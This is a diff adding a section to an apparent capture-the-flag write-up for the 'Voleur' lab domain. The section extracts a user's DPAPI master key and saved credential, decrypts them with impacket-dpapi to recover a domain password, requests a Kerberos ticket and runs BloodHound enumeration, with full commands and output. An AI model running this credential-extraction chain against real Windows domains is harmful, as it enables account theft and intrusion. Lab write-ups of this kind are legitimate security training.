@@ -223,3 +223,70 @@ The command completed successfully.
 
 ![](attachments/Pasted%20image%2020250913192943.png)
 
+获取DPAPI密钥与数据
+```
+[convert]::ToBase64String([IO.File]::ReadAllBytes("C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88"))
+[convert]::ToBase64String([IO.File]::ReadAllBytes("C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3"))
+```
+
+破解DPAPI
+```SHELL
+# 破解密钥
+$ impacket-dpapi masterkey -file protect_raw.txt -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
+Flags       :        0 (0)
+Policy      :        0 (0)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+# 破解用户凭证
+$ impacket-dpapi credential -file credentia_raw.txt -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[CREDENTIAL]
+LastWritten : 2025-01-29 12:55:19+00:00
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:target=Jezzas_Account
+Description : 
+Unknown     : 
+Username    : jeremy.combs
+Unknown     : qT3V9pLXyN7W4m
+
+```
+
+获取票据
+```shell
+impacket-getTGT voleur.htb/'jeremy.combs':'qT3V9pLXyN7W4m' 
+```
+再次收集域信息
+```SHELL
+KRB5CCNAME=/home/kali/Voleur/jeremy.combs.ccache bloodhound-python -u jeremy.combs -p qT3V9pLXyN7W4m -k -ns 10.10.11.76 -c All -d voleur.htb --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: voleur.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc.voleur.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.voleur.htb
+INFO: Found 12 users
+INFO: Found 56 groups
+INFO: Found 2 gpos
+INFO: Found 5 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC.voleur.htb
+INFO: Done in 00M 21S
+INFO: Compressing output into 20250913154024_bloodhound.zip
+```
